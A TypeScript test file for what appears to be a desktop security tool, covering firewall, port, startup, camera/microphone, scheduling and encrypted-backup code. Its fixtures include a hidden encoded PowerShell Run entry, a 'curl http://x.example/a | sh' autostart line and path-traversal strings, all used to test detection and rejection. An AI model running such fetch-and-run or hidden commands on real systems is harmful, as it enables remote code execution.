import { mkdir, mkdtemp, readFile, readdir, stat, writeFile, symlink, truncate } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { randomBytes } from "node:crypto";

import { describe, expect, it } from "vitest";

import { BackupError, createBackup, pruneBackups, readBackup, safeRelative } from "../src/engine/backup";
import { isDue, lastSlot, nextSlot, sanitizeSchedule } from "../src/engine/schedule";
import {
  newUses,
  parseConsentStore,
  parseDesktopEntry,
  parseLaunchPlist,
  parseLinuxFirewall,
  parseLsof,
  parseNetshFirewall,
  decodeProcAddress,
  parseNetstat,
  parseProcNetTcp,
  parsePactlSourceOutputs,
  parseRegRun,
  parseSocketFilter,
  parseSs,
  programOf,
  startupWarnings,
} from "../src/engine/security";


describe("firewall", () => {
  it("reads netsh profiles", () => {
    const on = "Domain Profile Settings:\n------\nState                                 ON\n\nPrivate Profile Settings:\n------\nState                                 ON\n\nPublic Profile Settings:\n------\nState                                 ON\n";
    expect(parseNetshFirewall(on).state).toBe("on");
    const partial = on.replace(/(Public Profile Settings:\n------\nState\s+)ON/, "$1OFF");
    expect(parseNetshFirewall(partial)).toMatchObject({ state: "partial", detail: "Off for: Public" });
    expect(parseNetshFirewall(on.replace(/ON/g, "OFF")).state).toBe("off");
    expect(parseNetshFirewall("access denied").state).toBe("unknown");
  });

  it("reads macOS and Linux", () => {
    expect(parseSocketFilter("Firewall is enabled. (State = 1)").state).toBe("on");
    expect(parseSocketFilter("Firewall is disabled. (State = 0)").state).toBe("off");
    expect(parseLinuxFirewall("Status: active\n\nTo Action From", "ufw").state).toBe("on");
    expect(parseLinuxFirewall("Status: inactive", "ufw").state).toBe("off");
    expect(parseLinuxFirewall("running\n", "firewalld").state).toBe("on");
    expect(parseLinuxFirewall("ERROR: You need to be root", "ufw").state).toBe("unknown");
  });
});

describe("listening ports", () => {
  it("parses ss and flags exposed risky services", () => {
    const out = [
      'LISTEN 0 4096 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=812,fd=3))',
      'LISTEN 0 128 127.0.0.1:5432 0.0.0.0:* users:(("postgres",pid=90,fd=5))',
      'LISTEN 0 50 [::]:3389 [::]:* users:(("xrdp",pid=77,fd=7))',
      "LISTEN 0 10 [::1]:631 [::]:*",
    ].join("\n");
    const ports = parseSs(out);
    expect(ports.find((p) => p.port === 3389)).toMatchObject({ exposed: true, process: "xrdp", pid: 77 });
    expect(ports.find((p) => p.port === 3389)!.risk).toMatch(/Remote Desktop/);
    expect(ports.find((p) => p.port === 5432)).toMatchObject({ exposed: false, risk: null });
    expect(ports.find((p) => p.port === 631)).toMatchObject({ exposed: false, process: null });
    expect(ports[0]!.exposed).toBe(true);
  });

  it("reads /proc/net/tcp without any tools", () => {
    expect(decodeProcAddress("0100007F")).toBe("127.0.0.1");
    expect(decodeProcAddress("00000000")).toBe("0.0.0.0");
    expect(decodeProcAddress("00000000000000000000000000000000")).toBe("::");
    expect(decodeProcAddress("00000000000000000000000001000000")).toBe("::1");
    expect(decodeProcAddress("0000000000000000FFFF00000100007F")).toBe("127.0.0.1");
    const table = [
      "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode",
      "   0: 00000000:170C 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1000        0 4242 1 0 100 0 0 10 0",
      "   1: 0100007F:1538 00000000:0000 0A 00000000:00000000 00:00000000 00000000  1000        0 4343 1 0 100 0 0 10 0",
      "   2: 0100007F:9C40 0100007F:1538 01 00000000:00000000 00:00000000 00000000  1000        0 4444 1 0 100 0 0 10 0",
    ].join("\n");
    const ports = parseProcNetTcp(table, new Map([["4242", { name: "x11vnc", pid: 77 }]]));
    expect(ports).toEqual([
      { port: 5900, address: "0.0.0.0", process: "x11vnc", pid: 77, exposed: true, risk: expect.stringMatching(/VNC/) },
      { port: 5432, address: "127.0.0.1", process: null, pid: null, exposed: false, risk: null },
    ]);
  });

  it("parses lsof and netstat", () => {
    const lsof = "COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME\nrapportd  510 me    4u  IPv4 0x1      0t0  TCP *:49152 (LISTEN)\nredis-ser 900 me    6u  IPv4 0x2      0t0  TCP 127.0.0.1:6379 (LISTEN)\n";
    const ports = parseLsof(lsof);
    expect(ports).toHaveLength(2);
    expect(ports.find((p) => p.port === 6379)).toMatchObject({ exposed: false, process: "redis-ser" });
    const netstat = "  Proto  Local Address          Foreign Address        State           PID\n  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4\n  TCP    127.0.0.1:9000         0.0.0.0:0              LISTENING       1234\n  TCP    10.0.0.5:50000         20.1.1.1:443           ESTABLISHED     1234\n";
    const win = parseNetstat(netstat, '"System","4","Services","0","144 K"\n"app.exe","1234","Console","1","10 K"\n');
    expect(win).toHaveLength(2);
    expect(win[0]).toMatchObject({ port: 445, process: "System", exposed: true });
    expect(win[0]!.risk).toMatch(/SMB/);
  });
});

describe("startup programs", () => {
  it("parses registry Run keys and warns about tricks", () => {
    const out = [
      "",
      "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
      '    OneDrive    REG_SZ    "C:\\Users\\me\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe" /background',
      "    Updater    REG_SZ    powershell.exe -w hidden -enc SQBFAFgA",
      "    Helper    REG_EXPAND_SZ    C:\\Users\\me\\AppData\\Local\\Temp\\svch0st.exe",
    ].join("\r\n");
    const items = parseRegRun(out, "HKCU Run");
    expect(items.map((i) => i.name)).toEqual(["OneDrive", "Updater", "Helper"]);
    expect(items[0]).toMatchObject({ warnings: [], program: "C:\\Users\\me\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe" });
    expect(items[1]!.warnings.join()).toMatch(/encoded PowerShell/);
    expect(items[2]!.warnings.join()).toMatch(/temporary/);
  });

  it("parses autostart entries and launch agents, skipping disabled ones", () => {
    const desktop = "[Desktop Entry]\nType=Application\nName=Syncthing\nExec=/usr/bin/syncthing serve --no-browser\n";
    expect(parseDesktopEntry(desktop, "/x/syncthing.desktop", "autostart")).toMatchObject({ name: "Syncthing", program: "/usr/bin/syncthing", warnings: [] });
    expect(parseDesktopEntry(desktop + "Hidden=true\n", "/x/s.desktop", "autostart")).toBeNull();
    expect(parseDesktopEntry("[Desktop Entry]\nExec=sh -c 'curl http://x.example/a | sh'\n", "/x/a.desktop", "autostart")!.warnings).toContain("Downloads and runs a script at every start");
    const plist = '<plist><dict><key>Label</key><string>com.example.agent</string><key>ProgramArguments</key><array><string>/Users/me/Library/.hidden/agent</string><string>--run</string></array></dict></plist>';
    expect(parseLaunchPlist(plist, "/L/a.plist", "LaunchAgents")).toMatchObject({ name: "com.example.agent", command: "/Users/me/Library/.hidden/agent --run" });
    expect(parseLaunchPlist(plist.replace("</dict>", "<key>Disabled</key><true/></dict>"), "/L/a.plist", "x")).toBeNull();
  });

  it("finds the program path", () => {
    expect(programOf('"C:\\Program Files\\App\\app.exe" --x')).toBe("C:\\Program Files\\App\\app.exe");
    expect(programOf("/usr/bin/foo -a")).toBe("/usr/bin/foo");
    expect(programOf("foo.service")).toBeNull();
    expect(startupWarnings("C:\\Program Files\\App\\app.exe")).toEqual([]);
  });
});

describe("camera and microphone", () => {
  it("reads the Windows consent store", () => {
    const out = [
      "HKEY_CURRENT_USER\\...\\ConsentStore\\webcam\\Microsoft.WindowsCamera_8wekyb3d8bbwe",
      "    LastUsedTimeStart    REG_QWORD    0x1da0b0e8a3c0000",
      "    LastUsedTimeStop    REG_QWORD    0x0",
      "HKEY_CURRENT_USER\\...\\ConsentStore\\webcam\\NonPackaged",
      "HKEY_CURRENT_USER\\...\\ConsentStore\\webcam\\NonPackaged\\C:#Program Files#Zoom#bin#Zoom.exe",
      "    LastUsedTimeStart    REG_QWORD    0x1da0b0e8a3c0000",
      "    LastUsedTimeStop    REG_QWORD    0x1da0b0e8a3d0000",
      "HKEY_CURRENT_USER\\...\\ConsentStore\\webcam\\NonPackaged\\C:#Users#me#AppData#Local#Temp#x.exe",
      "    LastUsedTimeStart    REG_QWORD    0x1da0b0e8a3c0000",
      "    LastUsedTimeStop    REG_QWORD    0x0",
    ].join("\r\n");
    expect(parseConsentStore(out, "camera")).toEqual([
      { device: "camera", app: "Microsoft.WindowsCamera" },
      { device: "camera", app: "x.exe" },
    ]);
  });

  it("reads PipeWire/PulseAudio recording apps and spots new ones", () => {
    const out = 'Source Output #12\n\tProperties:\n\t\tapplication.name = "Firefox"\nSource Output #13\n\t\tapplication.name = "obs"\n';
    const now = parsePactlSourceOutputs(out);
    expect(now.map((u) => u.app)).toEqual(["Firefox", "obs"]);
    expect(newUses([{ device: "microphone", app: "Firefox" }], now)).toEqual([{ device: "microphone", app: "obs" }]);
  });
});

describe("schedule", () => {
  const at = (s: string) => new Date(s);
  it("finds the latest slot and catches up once", () => {
    const daily = { frequency: "daily" as const, day: 0, hour: 9 };
    expect(lastSlot(daily, at("2026-11-17T10:00:00"))!.getHours()).toBe(9);
    expect(lastSlot(daily, at("2026-11-17T08:00:00"))!.getDate()).toBe(16);
    expect(isDue(daily, null, at("2026-11-17T10:00:00"))).toBe(true);
    expect(isDue(daily, at("2026-11-17T09:05:00").toISOString(), at("2026-11-17T10:00:00"))).toBe(false);
    expect(isDue(daily, at("2026-11-10T09:05:00").toISOString(), at("2026-11-17T10:00:00"))).toBe(true);
    const weekly = { frequency: "weekly" as const, day: 1, hour: 20 }; // Monday 20:00
    expect(lastSlot(weekly, at("2026-11-17T10:00:00"))!.toDateString()).toBe(at("2026-11-16T20:00:00").toDateString());
    expect(nextSlot(weekly, at("2026-11-17T10:00:00"))!.toDateString()).toBe(at("2026-11-23T20:00:00").toDateString());
    expect(isDue({ frequency: "off", day: 0, hour: 0 }, null)).toBe(false);
  });

  it("validates input", () => {
    expect(sanitizeSchedule({ frequency: "weekly", day: 3, hour: 22 })).toEqual({ frequency: "weekly", day: 3, hour: 22 });
    expect(sanitizeSchedule({ frequency: "hourly", day: 0, hour: 1 })).toBeNull();
    expect(sanitizeSchedule({ frequency: "daily", day: 0, hour: 24 })).toBeNull();
  });
});

describe("encrypted backup", () => {
  const password = "correct horse battery";

  async function setup() {
    const work = await mkdtemp(join(tmpdir(), "sentinel-backup-"));
    const docs = join(work, "Documents");
    await mkdir(join(docs, "taxes", "2026"), { recursive: true });
    await writeFile(join(docs, "notes.txt"), "hello");
    await writeFile(join(docs, "taxes", "2026", "return.pdf"), randomBytes(2.5 * 1024 * 1024));
    await writeFile(join(docs, "empty.txt"), "");
    await symlink("/etc/passwd", join(docs, "link")).catch(() => undefined);
    return { work, docs, dest: join(work, "usb") };
  }

  it("round-trips files and contains no plaintext", async () => {
    const { work, docs, dest } = await setup();
    const summary = await createBackup([docs], dest, password);
    expect(summary.files).toBe(3);
    const raw = await readFile(summary.file);
    expect(raw.includes(Buffer.from("hello"))).toBe(false);
    expect(raw.includes(Buffer.from("notes.txt"))).toBe(false);
    expect((await readdir(dest)).some((n) => n.endsWith(".part"))).toBe(false);

    expect((await readBackup(summary.file, password)).files).toBe(3);
    const target = join(work, "restored");
    const restored = await readBackup(summary.file, password, target);
    expect(restored).toMatchObject({ files: 3, bytes: summary.bytes });
    expect(await readFile(join(target, "Documents", "notes.txt"), "utf8")).toBe("hello");
    expect(await readFile(join(target, "Documents", "taxes", "2026", "return.pdf"))).toEqual(await readFile(join(docs, "taxes", "2026", "return.pdf")));
    expect((await stat(join(target, "Documents", "empty.txt"))).size).toBe(0);
    await expect(stat(join(target, "Documents", "link"))).rejects.toThrow();
  });

  it("rejects a wrong password, tampering, truncation and a non-empty target", async () => {
    const { work, docs, dest } = await setup();
    const { file } = await createBackup([docs], dest, password);
    await expect(readBackup(file, "wrong password!!")).rejects.toThrow(/Wrong password/);

    const tampered = join(work, "tampered.sbk");
    const bytes = await readFile(file);
    bytes[bytes.length - 40]! ^= 1;
    await writeFile(tampered, bytes);
    await expect(readBackup(tampered, password)).rejects.toBeInstanceOf(BackupError);

    const cut = join(work, "cut.sbk");
    await writeFile(cut, await readFile(file));
    await truncate(cut, (await stat(cut)).size - 100);
    await expect(readBackup(cut, password)).rejects.toThrow(/incomplete|damaged/);

    await expect(readBackup(file, password, docs)).rejects.toThrow(/new or empty folder/);
  });

  it("refuses weak passwords and a destination inside a source", async () => {
    const { docs } = await setup();
    await expect(createBackup([docs], join(docs, "backups"), password)).rejects.toThrow(/inside a folder/);
    await expect(createBackup([docs], "/tmp/x", "short")).rejects.toThrow(/at least/);
  });

  it("keeps only the newest backups", async () => {
    const { docs, dest } = await setup();
    for (const day of ["01", "02", "03"]) await createBackup([docs], dest, password, undefined, new Date(`2026-11-${day}T10:00:00Z`));
    expect(await pruneBackups(dest, 2)).toEqual(["Qalaa-backup-20261101-100000.sbk"]);
    expect((await readdir(dest)).length).toBe(2);
  });

  it("rejects unsafe paths", () => {
    expect(safeRelative("Documents/a.txt")).toEqual(["Documents", "a.txt"]);
    for (const bad of ["../x", "/etc/passwd", "a//b", "C:/x", "a\\..\\b", "a/./b", ""]) expect(safeRelative(bad)).toBeNull();
  });
});
